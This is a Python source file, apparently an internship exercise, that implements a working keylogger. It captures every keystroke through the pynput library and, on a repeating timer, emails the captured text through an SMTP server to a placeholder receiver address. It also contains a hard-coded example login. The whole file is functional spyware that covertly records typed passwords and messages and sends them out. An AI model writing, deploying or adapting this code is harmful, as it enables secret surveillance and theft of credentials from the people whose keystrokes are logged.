from pynput import keyboard
import os
import smtplib
from threading import Timer
import platform
class KeyLogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_logging()

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                self.log += " " + str(key) + " "

    def send_log(self):
        if self.report_method == "email":
            self.send_email()
        self.log = ""

    def send_email(self):
        #for receving key strokes by using mail of sender and reciever
        sender_email = "slash_mark_internship@example.com"
        #replace your actual mail address and password this is just my example...
        receiver_email = "slash_mark_hr@example.com"
        password = "3693"
        server = smtplib.SMTP("smtp.example.com", 587)
        server.starttls()
        server.login(sender_email, password)
        message = "Subject: KeyLogger Report\n\n" + self.log
        server.sendmail(sender_email, receiver_email, message)
        server.quit()

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.report()
            listener.join()

    def report(self):
        self.send_log()
        Timer(self.interval, self.report).start()
